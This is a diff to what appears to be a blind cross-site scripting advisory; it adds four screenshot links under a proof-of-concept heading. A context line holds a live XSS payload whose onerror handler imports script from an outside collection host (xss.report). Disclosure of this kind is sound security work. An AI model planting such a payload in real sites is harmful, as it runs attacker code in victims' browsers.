@@ -26,7 +26,10 @@ The application is vulnerable to Blind Cross-Site Scripting (XSS) through the pu
 `"><img/src/onerror=import('//xss.report/c/cyberbro')>`
 
 # Proof of Concept
-
+<img width="1920" height="1039" alt="4" src="https://github.com/user-attachments/assets/b4b08334-80d8-4ab8-a2ed-3479aaa81aa2" />
+<img width="1920" height="1022" alt="5" src="https://github.com/user-attachments/assets/e3eb4389-d276-4b85-b23d-b621c4b65d87" />
+<img width="1920" height="1034" alt="6" src="https://github.com/user-attachments/assets/b1f3f3fd-e68f-4a66-93a7-ddc808d8dd89" />
+<img width="1920" height="1031" alt="7" src="https://github.com/user-attachments/assets/ce5140ca-8e6e-4101-a5d4-915276bcf507" />
 
 # Extracted DOM
 ```js
